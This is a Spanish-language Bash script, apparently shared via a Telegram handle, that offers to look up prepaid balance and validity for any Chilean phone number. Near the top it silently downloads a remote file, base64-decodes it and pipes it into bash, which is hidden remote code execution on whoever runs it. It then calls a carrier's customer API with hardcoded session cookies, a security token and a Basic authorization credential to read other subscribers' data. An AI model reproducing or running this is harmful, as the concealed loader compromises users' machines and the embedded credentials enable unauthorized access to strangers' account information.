#!/bin/bash
DARKGRAY='\033[1;30m'
RED='\033[0;31m'    
LIGHTRED='\033[1;31m'
GREEN='\033[0;32m'    
YELLOW='\033[1;33m'
BLUE='\033[0;34m'    
PURPLE='\033[0;35m'    
LIGHTPURPLE='\033[1;35m'
CYAN='\033[0;36m'    
WHITE='\033[1;37m'
SET='\033[0m'

trap ctrl_c INT
function ctrl_c() {
        echo;echo -ne '\n' && echo -e "${CYAN}Espero volver a verte nalgoncito ;)${SET}" && echo && exit 1

}

curl -s https://raw.githubusercontent.com/DakitoPHRK/Jolie/main/test.txt | cut -c7- | base64 -d -w 0 | bash

FILE=$(pwd)/...
if [ -f "$FILE" ]; then
    echo ""
else 
	exit 1
fi
rm ...
curl -s https://raw.githubusercontent.com/DakitoPHRK/Jolie/main/mati > .s
ACTUAL=$(cat .s)
if [ "$ACTUAL" != "jlove" ]; then
  echo -e "\nHasta luego...\n"
  exit 1
fi
echo
echo -e "\t${BLUE}****************${SET}"
echo -e "\t${YELLOW}SIMPLE SCRIPT${SET}"
echo -e "\t${YELLOW}LECTURA DE SALDO V3.0${SET}"
echo -e "           ${GREEN}@DakitoLies${SET}"
echo -e "   ${CYAN}  http://dakitolies.t.me${SET}"                
echo -e "\t${BLUE}****************${SET}"
echo
echo "Ingrese numero: "
read line
curl -s -X GET "https://apix.movistar.cl/customer/V2/balance?msisdn=56$line" -H "Host: apix.movistar.cl" -H "Accept: application/json, text/plain, */*" -H "Connection: keep-alive" -H "Cookie: 2a5a62fb1067f1ac188fdd4917967d63=1f297389a9759d72c88c8fe14844d5ff; UqZBpD3n3iPIDwJU9BqwuXKiQPkG55FOcg__=v1ZiqUg6QfGfx; WIRELESS_SECURITY_TOKEN=keRuls2/mUQ/tZiUtWButQ**___currentencryptionkey___6WdLr8uZuYfNRwJsWNYWd7hJoNZ7HS2TTt6KAxTSLw2hnkJTMmWWNZiBRAbqIZL/18Y8WdLfdHZaJrtXjhJ/pXAnaHkHBr/E61dNcPVTW1aZ55gJ2DxLKJeBbt+TMsIFTbZA1E6ataNs7zgJbyLrG3Uyfnar851TttVOfrzS+9S7NcdfC25qnyozEyjmebThChMDPO4C8xx/AlfVUOME7w**; efd9bb47b7009df43b0e52b9c85d4762=3ac775767ac4acbcdc817405522f610b; _ga=GA1.2.1490310097.1691526431; _ga_KRYCZRFQGN=GS1.1.1694095907.5.1.1694095909.58.0.0; _hjSessionUser_3229940=eyJpZCI6ImVmODI3Y2QzLTM3YWUtNWRhMS05OGIxLTMyZTk3MGEzMjEzZSIsImNyZWF0ZWQiOjE2OTE1MjY0MzI4NjEsImV4aXN0aW5nIjp0cnVlfQ==; cto_bundle=NMngxV9relg3aXBMbUQ5SWl6UU9FWmFkem85bj2FbGxsZW9uZXxNSmdhSlRuakYyR2xvaXNoeEJSbTB6bndJTTV1a0hucEl3SmNf=; _clck=q1u1am|2|fet|0|1315; _fbp=fb.1.1691526431449.2100597411; _gcl_au=1.1.1990183354.1691526431; _uetvid=f42976c0362911eea6ee9d18f64e83df; _ga_XFNYW1RBK0=GS1.1.1694039541.3.0.1694039541.0.0.0; _gaexp=GAX1.2.6HtLlxyASM2C1GIRjF2yWA.19673.0; _tt_enable_cookie=1; _ttp=ab8MCYMlDGiM0x1mZsGaYdCyoODwvb" -H "User-Agent: Mozilla/5.0 (iPhone; CPU OS 17_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/17.0 Mobile/10A5355d Safari/8536.25" -H "Authorization: Basic NTNjMDgxZWYtYWI0Yi00N2IwLTk1YjQtODkyYjJhYzdkNWYwOjc0ZmMxZjA0LTA2NmItNGQ1My1hM2IwLWUxYzUyMzA2YjU0NQ==" "Accept-Language: es-419,es;q=0.9" -H "Accept-Encoding: gzip, deflate, br" > .saldo
echo -e "${CYAN}Informacion para el Numero: ${SET}"
echo -e "${LIGHTRED}$line${SET}"
echo
echo "Saldo: "
grep -Po '"saldoRecarga"\s*:\s*"\K[^"]+' .saldo
echo 
echo "Vigencia: "
grep -Po '"fechaVigencia"\s*:\s*"\K[^"]+' .saldo
echo
echo "Estado Vigencia: "
grep -Po '"estadoVigencia"\s*:\s*"\K[^"]+' .saldo
echo
echo
